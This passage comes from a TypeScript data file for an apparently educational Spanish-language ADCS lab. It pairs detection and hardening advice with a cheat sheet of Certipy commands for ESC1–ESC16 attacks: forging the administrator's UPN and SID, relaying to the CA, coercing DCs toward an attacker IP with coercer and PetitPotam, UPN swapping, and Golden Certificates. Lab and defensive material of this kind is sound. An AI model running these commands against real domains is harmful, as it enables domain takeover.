      "Forzar cifrado en peticiones ICPR (IF_ENFORCEENCRYPTICERTREQUEST).",
      "Mitigar la coerción de forma amplia: no solo PetitPotam (MS-EFSRPC). Restringir MS-RPRN/spooler y MS-DFSNM donde no haga falta; aplicar parches de coerción conocidos.",
    ],
  },
  {
    group: "mapping",
    detection: [
      "Cambios de UPN seguidos de emisión de cert.",
      "Escritura de altSecurityIdentities.",
    ],
    hardening: [
      "Aplicar KB5014754 y forzar mapping fuerte (StrongCertificateBindingEnforcement = 2). Desde sept-2025 Full Enforcement es obligatorio en entornos actualizados.",
      "No usar mapping débil por UPN.",
      "Restringir la escritura de altSecurityIdentities y del UPN.",
    ],
  },
];

export const cheatSheet: CheatSheet = {
  title: "Cheat Sheet ADCS ESC",
  intro: [
    "SIEMPRE PRIMERO:",
    "certipy-ad find -u 'user@dom' -p 'pass' -dc-ip IP -vulnerable -stdout",
    "# si LDAPS falla: -ldap-scheme ldap",
    "# el auth SIEMPRE cierra: certipy-ad auth -pfx X.pfx -dc-ip IP",
  ],
  blocks: [
    {
      title: "ESC1 — SAN arbitrario",
      lines: ["certipy-ad req ... -template VULN -upn 'administrator@dom' -sid 'S-...-500'"],
    },
    {
      title: "ESC2 / ESC3 — Any Purpose / Enrollment Agent",
      lines: [
        "certipy-ad req ... -template AGENTE",
        "certipy-ad req ... -template User -pfx user.pfx -on-behalf-of 'DOM\\administrator'",
      ],
    },
    {
      title: "ESC4 — escritura en plantilla",
      lines: [
        "certipy-ad template ... -template X -write-default-configuration",
        "# ... req como ESC1 + auth ...",
        "certipy-ad template ... -template X -write-configuration X.json -no-save",
      ],
    },
    {
      title: "ESC6 — flag EDITF",
      lines: ["certipy-ad req ... -template User -upn 'administrator@dom' -sid 'S-...-500'"],
    },
    {
      title: "ESC7 — ManageCA / ManageCertificates",
      lines: [
        "certipy-ad ca ... -add-officer user",
        "certipy-ad ca ... -enable-template SubCA",
        "certipy-ad req ... -template SubCA -upn admin@dom -sid ...",
        "certipy-ad ca ... -issue-request <ID>",
        "certipy-ad req ... -retrieve <ID>",
      ],
    },
    {
      title: "ESC8 / ESC11 — relay",
      lines: [
        "certipy-ad relay -target 'http://CA_IP' -template DomainController",
        "certipy-ad relay -target 'rpc://CA_IP' -ca CA -template DomainController",
        "coercer coerce -u user -p pass -d dom -t DC_IP -l ATACANTE_IP",
        "# clásico (a menudo parcheado): PetitPotam.py ATACANTE_IP DC_IP",
      ],
    },
    {
      title: "ESC9 / ESC10 / ESC16 — mapping",
      lines: [
        "certipy-ad account update ... -user victima -upn 'administrator'",
        "certipy-ad req ... -template <plantilla>",
        "certipy-ad account update ... -user victima -upn 'victima@dom'",
        "certipy-ad auth -pfx administrator.pfx -dc-ip IP",
      ],
    },
    {
      title: "ESC13 — issuance policy",
      lines: ["certipy-ad req ... -template ESC13 → auth (+ BloodHound)"],
    },
    {
      title: "ESC15 — EKUwu (plantilla v1)",
      lines: [
        "certipy-ad req ... -template V1 -upn admin@dom -sid ... \\",
        "  -application-policies '1.3.6.1.5.5.7.3.2'",
      ],
    },
    {
      title: "ESC12 / ESC14 — no directos por Certipy",
      lines: [
        "ESC12 → shell en la CA → certipy-ad forge (Golden Certificate)",
        "ESC14 → escribir altSecurityIdentities por LDAP (BloodHound)",
      ],
    },
    {
      title: "KB5014754",
      lines: [
        "Introdujo la extensión SID (mapping fuerte).",
        "ESC6 con EDITF: funciona solo (SID inyectado en SAN) incluso con Full Enforcement.",
        "ESC1: usa -sid del objetivo. ESC9/10/14/16: mapping débil (limitado tras Full Enforcement sept-2025).",
      ],
    },
    {
      title: "certipy vs certipy-ad",
      lines: [
        "# pip install certipy-ad → binario: certipy",
        "# Kali / paquetes APT → binario: certipy-ad",
        "# Este lab usa certipy-ad; en pip sustituye por certipy",
      ],
    },
  ],
};
